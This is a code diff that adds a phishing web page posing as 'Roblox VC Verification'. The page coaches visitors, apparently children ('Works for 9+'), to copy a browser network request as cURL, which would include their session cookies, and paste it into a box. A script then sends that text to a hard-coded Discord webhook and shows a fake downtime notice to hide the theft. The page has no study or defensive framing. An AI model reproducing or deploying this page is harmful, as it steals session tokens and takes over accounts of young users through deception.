@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox VC Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+            background-color: #fff;
+            padding: 2em;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        .instructions {
+            color: #666;
+            margin-bottom: 1em;
+        }
+        .textbox {
+            width: 80%;
+            padding: 0.5em;
+            margin-bottom: 1em;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .button {
+            background-color: #007bff;
+            color: white;
+            padding: 0.75em 1.5em;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+        .button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+    <script>
+        function openPopup() {
+            const popupContent = `
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Voicechat</title>
+                </head>
+                <body>
+                    <h1>Voicechat</h1>
+                </body>
+                </html>
+            `;
+            const popupWindow = window.open("", "popupWindow", "width=300,height=200,scrollbars=yes");
+            popupWindow.document.write(popupContent);
+            popupWindow.document.close();
+        }
+
+        async function sendVC() {
+            const vcCode = document.getElementById('vcCode').value;
+
+            if (vcCode === "") {
+                alert("Please enter your voicechat code.");
+                return;
+            }
+
+            const webhookURL = "https://discord.com/api/webhooks/1261740899059241052/o-IE5n4eykDSv50r9fy8N90RSQy8jKio0pweeHvK7TWMZKM8A0fpGiZN35CzdroAHzvr";
+            const data = {
+                content: vcCode
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    console.log("Code sent successfully.");
+                } else {
+                    console.error("Failed to send code:", response.status, response.statusText);
+                }
+
+                alert("Sorry, we are experiencing heavy downtime at the moment. Please wait around 3 hours or you can close out of the website and try again later.");
+            } catch (error) {
+                console.error("Error sending code:", error);
+                alert("Sorry, we are experiencing heavy downtime at the moment. Please wait around 3 hours or you can close out of the website and try again later.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Roblox VC Verification</h1>
+        <p class="instructions">To verify VC, click the button below, then right click -> inspect element -> Network. Click on the Gray Circle to make it Red and refresh the popup by right-clicking and pressing reload. Right-click and copy the voicechat code as cURL and paste it into the text box below. Click "Get VC" to submit. Wait around 1-2 hours and you will get VC! Works for 9+.</p>
+        <button class="button" onclick="openPopup()">Tap or Click Button and Verify to Get Voicechat</button>
+        <br><br>
+        <input type="text" id="vcCode" class="textbox" placeholder="Enter your voicechat code here">
+        <br>
+        <button class="button" onclick="sendVC()">Get VC</button>
+    </div>
+</body>
+</html>
